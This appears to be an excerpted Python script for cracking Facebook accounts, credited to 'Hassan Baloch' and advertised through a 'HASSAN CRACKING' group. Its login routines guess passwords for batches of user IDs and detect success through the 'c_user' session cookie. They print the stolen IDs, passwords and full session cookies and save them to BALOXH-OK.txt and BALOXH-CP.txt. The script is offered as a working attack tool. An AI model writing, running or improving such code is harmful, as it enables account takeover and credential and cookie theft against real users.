...
#github= HASSANBALOXH123
# fb page https://facebook.com/groups/1404861647108933/
...
os.system("xdg-open https://github.com/-hassanbaloxh123")
#app  check 
...
.----------------.  .----------------.  .----------------.  .----------------.  .-----------------.
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |  ____  ____  | || |    _______   | || |    _______   | || |      __      | || | ____  _____  | |
| | |_   ||   _| | || |   /  ___  |  | || |   /  ___  |  | || |     /  \     | || ||_   \|_   _| | |
| |   | |__| |   | || |  |  (__ \_|  | || |  |  (__ \_|  | || |    / /\ \    | || |  |   \ | |   | |
| |   |  __  |   | || |   '.___`-.   | || |   '.___`-.   | || |   / ____ \   | || |  | |\ \| |   | |
| |  _| |  | |_  | || |  |`\____) |  | || |  |`\____) |  | || | _/ /    \ \_ | || | _| |_\   |_  | |
| | |____||____| | || |  |_______.'  | || |  |_______.'  | || ||____|  |____|| || ||_____|\____| | |
| |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'
                                                       
[+]==============================================
[+] CREATED BY   :  HASSAN BALOCH 
[+] FB GROUP     :  HASSAN CRACKING 
[+] ON GITHUB    :  hassanbaloxh123
[+] TOOL STATUS  :  RANDOM
[+] TOOL VIRSION :  0.1
[+]=============================================="""
...
def xerx1():
	...
	print('[?] Ids saved in BALOXH-OK.txt,BALOXH-CP.txt')
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[BALOXH-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in xerx_xd:
					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/BALOXH-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[BALOXH-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/BALOXH-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/BALOXH-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-BALOXH] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-BALOXH] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-BALOXH] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-BALOXH] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-BALOXH] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
